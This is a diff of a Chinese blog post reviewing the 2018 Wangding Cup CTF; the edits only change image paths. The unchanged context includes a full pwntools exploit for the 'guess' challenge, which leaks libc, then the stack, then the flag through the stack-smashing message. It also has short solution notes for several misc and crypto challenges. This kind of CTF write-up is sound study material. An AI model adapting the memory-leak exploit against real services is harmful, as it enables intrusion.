@@ -21,12 +21,12 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/blend/1.png">
 <meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/blend/2.png">
-<meta property="og:image" content="http://assassinq.com/pics/IMG_9260.PNG">
-<meta property="og:image" content="http://assassinq.com/pics/IMG_9259.PNG">
-<meta property="og:image" content="http://assassinq.com/pics/IMG_9261.PNG">
+<meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/minified/1.PNG">
+<meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/minified/2.PNG">
+<meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/minified/3.PNG">
 <meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/welcome/1.png">
-<meta property="og:image" content="http://assassinq.com/pics/屏幕快照%202018-08-30%20下午8.39.51.png">
-<meta property="og:updated_time" content="2018-09-11T12:26:15.070Z">
+<meta property="og:image" content="http://assassinq.com/pics/2018-网鼎杯-review/shanghai/1.png">
+<meta property="og:updated_time" content="2018-10-06T12:48:03.959Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018 网鼎杯 review">
 <meta name="twitter:description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
@@ -271,9 +271,9 @@
 <p>借鉴澪师傅的exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">gets_addr = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0_addr = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">of_len = argv_0_addr - gets_addr</span><br><span class="line">offset = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got_addr = <span class="number">0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * of_len + p64(gets_got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * of_len + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * of_len + p64(stack_addr - offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>取出Alpha0和Green0通道的图片后异或得到flag。</p>
-<p><img src="/pics/IMG_9260.PNG" alt="Alpha0"></p>
-<p><img src="/pics/IMG_9259.PNG" alt="Green0"></p>
-<p><img src="/pics/IMG_9261.PNG" alt="flag"></p>
+<p><img src="/pics/2018-网鼎杯-review/minified/1.PNG" alt="Alpha0"></p>
+<p><img src="/pics/2018-网鼎杯-review/minified/2.PNG" alt="Green0"></p>
+<p><img src="/pics/2018-网鼎杯-review/minified/3.PNG" alt="flag"></p>
 <h2 id="双色块"><a href="#双色块" class="headerlink" title="双色块"></a>双色块</h2><p>先上binwalk得到图片，key为ctfer2333。</p>
 <p>尝试把gif每一个帧拼凑成图片，发现无法得到一个正常的二维码。</p>
 <p>再猜测将紫色与绿色色块分别表示1和0，先提取出每张图片：</p>
@@ -284,7 +284,7 @@
 <h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>解压后用cat把所有的文件合并，得到一个zip文件，爆破密码得到flag。</p>
 <p><img src="/pics/2018-网鼎杯-review/welcome/1.png" alt="爆破结果"></p>
 <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>维吉尼亚解密，<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">在线解密</a>，直接得到flag。</p>
-<p><img src="/pics/屏幕快照 2018-08-30 下午8.39.51.png" alt="flag"></p>
+<p><img src="/pics/2018-网鼎杯-review/shanghai/1.png" alt="flag"></p>
 <p>同时还得到密钥是icqvigenere。</p>
 <h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>之前PladCTF有<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">一道类似的题目</a>，在xman的时候也分析过。</p>
 <p>apl最大的特点是从右往左计算。<code>⍵</code>代表右侧的变量，<code>α</code>代表左侧的变量。</p>
